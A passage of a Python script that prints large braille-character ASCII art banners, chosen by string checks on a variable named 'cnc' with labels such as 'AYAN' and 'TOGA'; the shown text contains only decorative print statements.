            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣷⡽⣿⣿⣿⡇⢻⡽⡾⣣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣵⣿⣿⣵⣿⣯⣾⣿⣿⣿⣿⣿⣿⡿⣿⣟⣟⢷⣺⣿⣿⣿⡿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢁⣿⣿⣿⣿⣿⣿⣿⡇⡾⠟⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⣿⣮⢷⣻⢟⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣛⣅⠰⣌⠻⣿⣿⣿⣿⣿⣿⠧⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⣿⣿⣿⣿⣷⣣⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣛⣥⣾⣿⣿⢸⣶⣅⠤⡙⣛⣛⡉⠠⠂⢦⢊⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡞⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣷⡎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⡿⣛⣕⣾⣿⣿⣿⣿⣿⢸⣿⣿⣿⣶⣾⣷⢠⠄⢀⣮⡃⡡⡝⢿⣿⣿⣿⣿⣿⣿⣿⡾⠋⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⡿⠋⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⡘⢽⣻⡿⣿⡿⠃⡏⣴⣿⣿⣿⣮⣲⠥⢈⣉⡍⢉⣉⣉⡀⢤⠀⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢋⡕⣴⣿⣿⡟⠩⠝⣻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⡟⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡙⡬⣝⣛⣛⠓⡡⡹⣿⣿⣿⣿⣿⣿⣷⣾⣿⣤⣭⣿⠞⠁⣧⠙⠪⣛⢿⣿⣿⣿⠉⢹⣿⠉⢙⣿⣿⣿⣟⡯⠛⡉⡁⡀⢫⣾⣿⣿⠏⢠⣿⣿⣷⣾⣧⣍⢟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⡿⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡇⣿⡏⡏⡞⣽⣷⣝⢿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⢎⡞⣵⣾⣿⣾⢷⡹⣿⡿⠿⢿⣿⣶⣿⣿⣿⠿⢋⣤⡆⣿⣿⣇⣿⣿⣿⠏⢠⣿⣿⣿⣿⣿⣿⣿⣷⣮⡰⣞⣉⣛⠿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⡇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⠇⣷⠃⡾⣽⣻⡿⣦⡝⠿⠿⠿⠿⠿⣿⣿⣟⣛⠘⣸⣿⣿⣿⣿⣿⣷⣶⣶⣶⣤⣤⣄⡹⣋⣤⣾⣿⣿⢰⣿⡟⣼⡭⢑⣴⣾⣦⡉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡝⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣘⠀⠏⣽⣻⣱⠟⢰⠏⠠⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⢏⣾⡿⣵⣿⣿⣿⣿⡧⢳⣻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣼⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣦⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠃⢣⠃⠀⠃⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢕⣾⢋⣼⢿⠿⡻⢯⣟⣺⣭⣭⣽⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣷⣌⠟⣻⢿⣿⣿⣿⠿⣿⢿⣿⣯⣭⣵⡶⠶⠄⢠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣻⣵⡾⣖⣠⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣾⣕⣛⢛⣚⣫⣭⣭⣭⣭⣷⣾⣿⣿⠃⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣛⣛⣛⡛⢛⡉⣭⠏⠗⠘⢘⣫⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣟⣯⠙⢈⡠⠔⡈⢢⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⢟⣻⣽⣿⣿⡿⢟⣣⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣽⡾⠿⠿⢿⣛⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣛⡿⠿⠿⢿⣿⣿⣿⡿⠷⢏⣛⣭⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')


        elif "AYAN" in cnc:				
             print('⡍⢈⠄⡀⠀⠠⠀⢀⡀⠀⠠⠀⠀⡀⠀⠠⠀⠀⡀⠀⠀⡀⠀⠀⣠⣶⠻⣍⡟⣜⢣⢎⣵⡟⢯⣹⢫⢝⡷⣇⡞⣱⢫⡝⣛⠻⣶⣤⡀⠀⠀⠀⢀⠀⠀⢀⠀⡀⠀⠄⢀⠀⡀⠠⠀⢀⠀⡀⠀⠄⠀⠀⡀⠠⠀⡄ ')
             print('⠄⠢⠐⠄⠀⠐⠰⠀⠆⠀⠐⠢⠁⠆⠐⡀⠢⠁⠄⠀⡀⠄⣱⣾⠟⣩⠳⡜⡼⡌⣷⡻⣍⢞⡱⢎⡳⢎⣜⠻⢷⣡⠳⣜⡡⢏⡬⠻⣿⣦⡈⠐⠠⠀⢀⠰⠀⠒⠀⡀⠐⠂⠔⠀⢀⠢⠐⠄⠀⠂⠜⠀⠆⠐⠀⠆')
             print('⡠⠀⠀⠀⢂⠑⡀⠀⠠⡈⠄⡀⠀⢀⠂⠄⡀⠀⢈⠠⢀⡾⡯⣙⢎⡵⢫⡜⡱⡜⢥⠳⡜⢮⡱⢫⡜⣣⢮⡙⡖⣆⠯⡴⡙⣎⢖⡣⣜⠻⣿⣄⠀⢂⠄⠂⠀⠀⢂⡐⠀⠀⢀⠂⡄⠀⠀⢐⠠⣈⠀⠀⠐⢠⢈⠀')
             print('⠐⡈⢂⠀⠀⠐⡈⢀⠀⠀⠐⡈⠀⠀⠀⣀⣰⣤⣴⡟⢋⠴⣩⠎⡼⣑⢮⣱⣎⠧⡛⡜⡥⣋⠷⣸⠱⢎⡵⢚⡴⣿⣰⠹⣌⠶⡱⡌⣇⢻⡿⣷⣤⣀⣐⡀⠂⠀⠀⠈⡐⠀⠀⠀⡈⠄⠂⠀⠀⠠⢀⠁⠀⠀⠂')
             print('⠂⠄⠀⠁⡀⠂⠌⠀⠠⠀⣐⣤⣴⣶⣿⣿⣿⢿⣾⠏⡐⡘⢣⡕⡫⢖⣩⣾⣻⡑⣮⢱⡙⡴⣩⠚⣥⠛⡼⣘⢣⠞⡸⢿⣷⣌⡳⢥⠓⡜⢢⠿⡜⢿⣼⢿⣿⣷⣶⣦⣤⣀⠡⠐⡀⠄⠈⢁⠐⠠⠁⠀⠠⠒⠠⠁')
             print('⠊⢀⠠⠄⠀⠃⠠⠠⠐⠀⣿⣿⣿⣿⣿⣿⣧⣿⠏⢀⡿⢁⣼⡱⡹⢬⣿⠓⢦⠱⡟⢦⡹⢔⢣⢛⡤⡛⡴⢩⢎⠽⣑⠎⣏⢻⣷⣎⡓⣾⠙⢶⠻⡎⢿⣦⣿⣿⣿⣿⣿⣿⡇⠐⠀⠠⠀⠄⠈⠒⠀⡀⠄⠁⠒⠀')
             print('⡀⠠⠐⠄⠀⣀⠠⠡⠀⡀⠸⣿⣿⣿⣿⢋⣿⡏⠤⣿⢇⡛⢦⠓⣍⣾⠫⡔⣃⢻⡏⠧⣜⡩⢖⣣⠚⡥⣙⠦⣍⠚⣌⠞⣙⠦⡽⣶⣝⡸⢧⣈⡷⢿⡈⢿⣦⢻⣿⣿⣿⣿⠀⡀⢀⠡⠠⠁⢀⢀⠂⠄⠂⡀⢀⠁')
             print('⡠⠁⠀⢀⠂⡐⠀⠀⠀⠄⡁⢻⣿⣿⡿⣿⡟⡜⣱⡟⢬⡹⢌⠳⣼⠷⢣⠙⠤⢻⡏⡕⢢⡓⢬⢆⡭⢹⣦⠓⣌⠓⡼⣯⡜⡜⡰⢩⣿⡵⢪⡍⢦⡙⣯⢎⢿⣟⢻⣿⣿⠃⠀⡐⢂⠀⠀⠈⠄⡠⠀⠀⠐⠠⢈⠀')
             print('⠐⠈⠄⠀⠀⠐⠈⠐⠀⠀⠈⣿⣿⣿⡟⣌⠳⣼⡏⡖⢥⢋⣼⣏⠞⣠⣿⢌⣹⣧⢍⠣⡜⠢⢎⠰⣃⢿⣝⣨⠣⢔⠹⣷⡜⡥⢃⡜⢿⣇⠞⡤⢃⢿⣎⠚⣿⣿⣿⡟⢀⠂⠀⠀⠠⠁⠅⠀⠀⠂⠁⠂⠀⠀⠂')
             print('⠒⠈⠈⠀⠄⡘⠈⠈⠁⡐⢀⠂⠘⣿⣿⢱⢎⡱⣻⣑⢎⠳⢌⣿⡐⣚⢤⣿⢠⣿⢿⣨⠱⣬⢃⢬⠱⣐⢊⣿⣷⣉⢎⡱⢹⣿⣃⣧⠸⡌⢿⣱⢊⡝⣸⡧⢻⡽⣿⡿⠀⠀⠠⠐⢀⠂⠁⢐⠀⢂⠁⠈⢁⠐⢠⠁')
             print('⠈⠠⠐⠠⠐⠀⠡⢀⠐⠀⠂⢀⠠⢸⣏⡖⣾⡔⣿⢌⣎⢳⢸⡧⣱⣏⣾⣿⡂⣿⠘⣷⢂⡹⣧⢹⣎⠕⢦⡘⣿⢷⣦⡑⡃⢿⣻⣼⣧⠓⡼⣷⢩⡒⡭⣿⡹⣧⢻⣇⠀⠠⠀⠁⠂⡀⠄⡀⠈⠀⠄⡀⠄⠈⠀⡀')
             print('⡀⠠⠁⠁⠀⢠⠐⠠⢀⠀⣀⠠⢀⣿⡞⣰⡿⢏⣿⠲⣌⠆⣿⡅⣿⡾⣋⣬⣷⣿⣷⢼⣷⣐⢻⣧⣽⢾⡠⢓⠸⣧⣭⣿⣷⣾⣧⡙⢿⣯⠐⣿⡦⡝⡴⣿⠱⣿⣘⣿⣦⠑⢀⠀⡀⠄⠠⢁⠀⣀⠂⠄⢂⠀⣀⠁')
             print('⠄⠁⢀⠈⠐⠠⢀⠀⡀⠐⠀⢀⣾⡿⣜⡰⣿⢃⣿⠸⡜⣸⡿⢻⣿⣿⡿⢟⣟⣿⢿⣝⠺⠿⣎⣷⡈⠛⠿⠿⣦⣜⣯⣷⣿⣿⡿⢿⣷⣿⣏⣿⡗⢭⢒⣿⠱⣿⢰⠻⣿⢷⣄⠒⠀⢀⠀⠠⠀⠤⠀⠀⡀⠢⠠⠀')
             print('⠐⡈⠐⠀⠀⠨⢀⠡⠀⠀⣾⢿⣧⢍⡣⣿⡜⣹⡦⢓⣹⣧⢾⣿⠏⡁⠘⣿⣿⣎⢻⣦⠀⠙⠿⣧⠀⠄⡀⠉⣹⡟⠉⠛⣿⣷⣮⠻⣿⣿⡉⣷⢜⢎⣿⢆⣟⠺⣔⣻⡜⣿⣦⣀⠈⡐⠀⠀⠀⠂⠄⡁⠀⠀⡀')
             print('⠄⠂⠈⠁⡀⠂⠄⠂⠀⣀⣾⠟⣾⢹⢆⢧⣹⣖⢿⡇⢧⢸⣟⣿⠃⣸⣷⢰⣾⡞⣿⡆⠙⢀⠡⠀⠄⠀⠌⡀⠁⠛⢸⣇⣰⣾⣽⣿⡇⠙⣿⣻⣹⡎⣞⡿⣸⣏⡗⣮⢱⣿⡶⣱⣛⢷⣦⣄⡂⠄⠈⠀⢀⠀⣤⡀')
             print('⠈⠠⠀⠄⠀⠃⢀⠀⢠⣾⠯⣽⣿⡩⢞⡴⣩⢿⣌⣿⢢⢽⣾⡟⠀⢿⣿⢹⣿⣏⣿⡇⠐⡀⢂⠁⡈⠐⠠⢀⠁⠂⢸⣿⢿⣿⣟⣿⡟⠀⣻⣯⣽⡗⣼⡗⣿⢷⣙⢦⡏⢾⣯⡷⢭⣚⡴⣫⡝⣟⠷⡶⢶⢾⣻⡇')
             print('⢀⠈⠐⠈⠀⢀⠠⢨⣿⢣⣿⣿⡷⣙⢎⠶⣱⠺⣷⣿⡇⢺⡾⣷⠀⠘⣿⣯⡙⣵⡿⠁⠠⠐⡀⢂⠡⢈⠐⡈⠠⠁⠘⣿⣯⣋⣽⣿⠃⠀⣼⠷⠜⡧⣾⣱⣿⢪⡝⢶⡙⡯⡽⣿⣇⡞⡽⣷⣮⣍⣻⣜⣭⣾⠟⠀')
             print('⡀⠂⠀⠀⡁⠂⣰⣟⢮⣿⣿⣿⣷⢩⢎⣳⢂⢯⠹⣿⣿⡩⣿⠙⢧⡀⠈⠙⠛⠋⠁⢀⠂⠡⠀⠄⢲⠀⡡⢀⠁⠂⠄⠈⠛⠓⡛⠁⢀⡼⠛⠃⣼⣗⡿⣼⢧⠳⣞⣣⠟⣵⣹⣿⣿⣿⡜⡽⣟⠿⠿⠟⠋⢀⠠⠀')
             print('⠠⠁⠐⠀⣰⣟⣺⣿⣿⣿⣿⣿⣩⢾⡇⣏⣎⠳⡭⣿⣷⡸⣧⢀⡉⠛⡛⢀⢂⠐⠠⠈⠄⡁⠈⠄⢂⠐⠠⢈⡐⠈⠠⢀⡀⢛⠛⡛⣀⠣⢰⣿⡏⣷⡟⣮⢛⢶⡱⣛⠶⡥⣿⣿⣿⣿⡼⣹⣆⠠⠐⠀⠀⠀⡀')
             print('⡀⠁⠠⢰⡟⣼⣿⣿⣿⣿⣿⣿⣖⣺⣿⡲⡜⢧⠳⣜⢻⣷⠽⣧⡘⡐⢠⠡⠰⣮⣀⠡⠐⢀⠡⢈⠠⠈⠄⢂⠠⢀⣡⡤⢈⠤⠘⡐⢠⢢⣿⣽⣧⡿⣙⠶⣫⢎⡷⢭⣳⣹⣿⣿⣿⣿⣿⣇⣿⠀⠁⠐⠠⠐⠀')
             print('⠄⠀⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣧⣛⡭⣓⢮⡙⢾⣻⣽⣷⡔⢀⠂⠄⠠⠉⠛⡓⠶⠶⠤⠴⠦⠶⠖⠚⠋⢉⠀⠂⠌⡐⠐⣤⣿⣿⣿⡟⣵⢫⡽⣡⢟⡼⣣⢇⣿⣿⣿⣿⣿⣿⣿⣿⠀⡀⠌⠐⠈⠄')
             print('⠈⠄⠁⢺⣿⣿⣿⢹⣿⣿⣿⣿⣿⡏⣿⣿⣖⢧⡛⣼⡙⣎⢎⠯⣿⣿⣄⢂⠈⡀⠡⠐⠠⢀⠐⡈⠐⠠⠂⢉⠐⢈⠠⠈⠐⠠⣠⣾⣿⣿⣿⣿⡹⢖⣣⣝⢣⡟⣼⢣⣿⣿⣿⣿⣿⣿⣿⣿⡇⠐⠀⢂⠀⢀⠂')
             print('⠂⡀⠀⠌⢿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣹⣿⣿⣮⢝⢶⡹⢞⣎⠳⣭⢻⢿⣦⣄⣀⡡⠀⠂⠀⢂⠀⠌⠀⠡⠀⣈⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡯⣝⣫⠶⣭⢳⢞⣥⣿⣿⣿⣿⣿⣿⢻⣿⣿⠀⢀⠀⡀⠂⠌⠀')
             print('⠠⠄⠁⠀⠀⠙⢿⣿⡄⠙⢿⣿⣿⣿⣷⣻⣿⣿⣿⣖⡝⣮⣜⢳⡬⢧⢫⣿⣿⣿⣿⣿⣷⣷⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡱⢧⡳⢏⡶⣋⣾⣿⣿⣿⣟⣿⣿⡏⢸⡿⠃⠀⠄⠂⠄⠀⠀⡁')
             print('⡁⠂⠀⠈⠠⢀⠂⠀⠉⠁⠄⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣶⣜⢧⡹⢎⡳⣬⢿⡟⠙⢷⣮⡗⢯⡻⣽⢫⣟⡾⢯⣹⢿⣿⣿⣿⣿⡟⢿⣧⡟⣭⢳⣭⢛⣴⣿⣿⣿⣿⠏⣼⣿⣿⠃⠉⠁⠠⢀⠀⠀⢐⠈⡐⠀')
             print('⠡⢰⢠⠂⠁⠀⠠⠐⠀⠁⠈⠀⠄⡀⠹⣿⣿⣿⣌⣻⣿⣿⣿⣿⣷⣯⣭⢳⡱⣚⣧⠀⠀⠉⢛⡿⣵⡾⣛⡽⠞⠋⢁⠀⣷⢹⣿⣿⣿⣿⣿⢏⣳⣭⣶⣿⣿⣿⡿⠛⢁⣰⣿⣿⠃⠀⢀⠂⠁⠈⠀⢀⠂⠈⠀⠆')


        elif "TOGA" in cnc:
             print('⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣷⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
             print('⣿⣿⣿⣿⣿⣿⣿⣧⠉⠹⣿⣿⣿⣿⣿⡿⢋⠉⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
             print('⠍⣉⠛⠿⢿⣿⣿⣿⡄⢡⠹⣿⣿⡿⠋⡀⢀⣼⣿⣿⣟⣉⣉⠛⠿⠻⠿⠟⣿⡿⠶⠭⠉⠙⠛⠉⣉⣭⣭⣉⡙⣛⣿⡿⠿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
             print('⣷⣄⡙⢶⣄⡙⠉⣿⣿⡀⣇⠸⡿⢁⡞⢠⣾⣿⣿⣿⣟⠿⢿⣟⣿⣿⣿⣧⣤⣤⣶⣶⣶⣶⣶⣶⣤⣤⣍⣙⡛⠣⢤⣶⣤⣤⣤⠄⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
             print('⣿⣿⣿⣦⡙⢿⣦⡙⢿⣇⢸⡆⢀⡞⢠⣿⣿⠟⢋⠠⣐⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣌⡙⠻⣗⡚⠛⠛⠛⠛⣿⢘⡿⠉⣹⣿⣿⣿⣿⣿⣿⣿⣿')
             print('⢿⣿⣿⣿⣿⣦⠙⢿⣄⠹⠘⡿⣸⠃⣿⡟⢁⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡉⠻⡿⡏⣤⠄⣿⠼⠃⠱⠿⢿⣿⡿⢿⣿⣿⣿⣿')
             print('⣀⡈⠁⠙⠿⣿⣷⣄⠹⣦⠀⢱⡟⠘⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣿⣿⣿⣿⣷⣮⣙⠻⢿⠷⡐⠾⠛⣸⠇⠠⢠⣾⡟⢶⣶⣦⣌⣿⡇⣿⣿')
             print('⣀⠛⢶⣌⠠⣈⠙⠿⠧⠈⢧⠸⠃⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡙⢿⣿⣷⣌⢻⣿⣿⣿⣿⣿⣿⣦⣅⠈⠀⢠⠟⠀⠡⣾⣿⣿⡜⣿⣿⣿⣿⡦⡙⢿')
             print('⡈⠳⣦⣤⣁⠀⠀⠀⢾⣿⡌⢂⣼⡟⣩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠑⡘⣿⣿⣿⣧⡙⣿⣿⣿⣿⣿⣿⣿⡇⠀⠃⢀⣴⣇⢹⡼⣿⣧⡸⣿⠟⣋⣴⣿⣄')
             print('⣿⣦⡌⠛⠋⣴⣿⢄⠢⠹⢃⣾⢋⣴⣿⣿⣿⣿⣿⣿⠏⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠙⣿⣷⢱⡘⣿⣿⣿⣷⡈⢿⣿⣿⠿⠿⢿⡇⢀⣴⣿⣿⣿⡿⠇⠙⠛⣁⣥⣾⣿⠿⢋⣴')
             print('⡀⠀⠀⣶⡆⠟⠁⠃⠀⢠⡿⢣⣾⡟⣩⣿⡿⣹⣿⠇⣼⣿⣿⣿⣿⣿⣿⠃⣿⣿⣿⣿⡆⢿⣿⡆⢧⢻⣿⣿⣿⣿⡄⢈⣉⣽⣷⣶⠄⣨⣭⣭⡍⠒⠢⠌⠐⠚⣋⠉⢉⣠⣶⣿⡿')
             print('⣟⠃⣼⠿⠃⣀⠀⠄⢠⡾⢡⣾⡿⢱⣿⡿⢠⣿⠏⢸⣿⣿⣿⣿⣿⣿⡏⠀⢸⢿⣿⣿⣷⠈⣿⣧⢸⡎⣿⣿⣿⣿⣿⡄⢣⣀⣀⣀⣀⠠⣉⢙⠛⠛⠛⠋⠩⣤⣶⣾⣿⣿⣿⠟⡡')
             print('⢉⠀⠀⠀⠀⠀⡠⢀⣿⢃⣿⣿⢁⣿⣿⢡⣿⡏⠀⣿⣿⣿⣿⣿⣿⣿⡇⣼⢸⡆⣿⣿⣿⠀⠸⣿⡆⣧⢸⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⡀⠲⠶⠶⠤⠤⠤⠀⡈⠙⠿⠟⠉⠁⠀⣠')
             print('⠀⠀⠃⠀⠠⠊⠀⣼⠇⣼⣿⡏⣾⣿⡏⣼⣿⠀⢰⣿⣿⣿⣿⣿⣿⣿⠠⠯⢸⣿⢸⣿⣿⠀⠀⢿⣇⢿⠀⣿⣿⣿⣿⣿⣧⠘⣋⠁⠘⠁⠀⢂⣀⠲⠀⠀⢤⣄⡀⠀⠀⠀⢠⡾⠋')
             print('⠀⠀⢀⠀⠀⡾⢰⡿⢰⣿⣿⢇⣿⣿⢠⣿⠇⠂⢸⣿⣿⡿⠿⠛⢛⣉⣤⣶⣦⣭⣤⣭⣥⠠⡘⠀⡉⠸⢀⢹⣿⣿⣿⣿⣿⡇⠻⠃⠀⠐⠇⠈⢿⣂⡀⠄⢹⣿⠁⠊⣰⡦⠀⠀⠀')
             print('⠂⡀⠀⠀⡆⡇⣼⡇⢸⣿⣿⢸⣿⡿⣸⣿⠀⠘⢘⣩⣵⣶⣾⣿⣿⡿⠛⠉⡙⠿⠟⠋⣠⣤⣤⣌⣙⠐⠠⠀⣿⣿⣿⣿⣿⣷⠀⠂⢀⡘⠳⠖⣤⣭⣟⡀⠘⠇⠀⠀⠋⠀⣀⣴⣦')
             print('⠐⠁⠀⣿⠀⠀⣿⠀⢸⣿⣟⢸⣿⠇⢉⣡⣶⣿⠿⠟⠛⣉⣉⣉⣭⣴⣶⣾⡅⠀⣴⣿⣿⣿⠿⡋⠩⠿⠶⠀⢹⣿⡿⣿⣿⣿⢀⡾⠀⢹⣷⣮⣍⡛⠿⣿⡀⠀⠀⠀⢠⣾⣯⣿⣭')
             print('⠀⠀⢠⠈⠀⢰⣿⠀⣾⣿⠿⠘⣡⣾⠿⠿⠛⣁⣐⣛⣛⠛⢿⣿⣿⣿⣿⣿⣧⣿⣿⠟⠋⠀⠀⡀⣀⣀⣀⠀⢸⣿⡇⣿⣿⣿⠀⠀⣴⢈⠙⢿⣿⣿⣶⢹⣷⡀⠡⣠⠈⢻⣿⣿⣿')
             print('⠄⠀⠸⢀⡆⢸⣿⣀⣀⠀⠀⢹⣿⢿⠓⡀⠾⢿⠿⢿⣿⣷⣾⣿⣿⣿⣿⣿⣿⡏⠁⡀⣐⣮⣿⣿⣿⣿⣿⡇⠈⣿⡇⢹⡏⠩⣅⠘⠱⠿⣷⡄⠹⣿⣿⡇⢻⣷⠀⠙⢦⠈⠹⣿⣿')
             print('⠓⠂⠀⠾⠃⢸⣟⢹⣿⠇⠀⠈⠟⠀⠀⠉⠈⠉⢉⣁⢀⣉⣙⢻⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⠁⠘⡇⠐⠩⣴⣿⣶⣄⠻⡀⢻⣿⣿⡎⣿⣧⠀⠈⠳⡈⠹⣿')
             print('⠶⠃⠀⢀⡄⢸⣇⢸⣿⠀⢀⠀⢱⠀⣀⣤⣸⣭⣥⠶⢿⣿⣿⣷⠾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣿⠀⠄⣰⡟⣰⣄⠙⣿⣿⣦⡑⠸⣿⣿⣷⢸⣿⠀⠀⢰⣈⠀⠈')
